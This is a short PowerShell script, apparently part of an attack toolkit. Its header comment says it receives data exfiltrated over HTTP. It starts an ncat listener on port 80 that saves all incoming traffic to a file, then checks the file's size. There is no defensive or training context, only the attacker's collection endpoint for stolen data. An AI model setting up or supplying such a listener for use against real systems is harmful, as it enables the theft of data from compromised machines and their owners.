# http-listener.ps1  — receive data exfiltrated over HTTP
ncat -lvp 80 > received_http.dat
# verify what landed:
Get-Item received_http.dat | Select-Object Name, Length
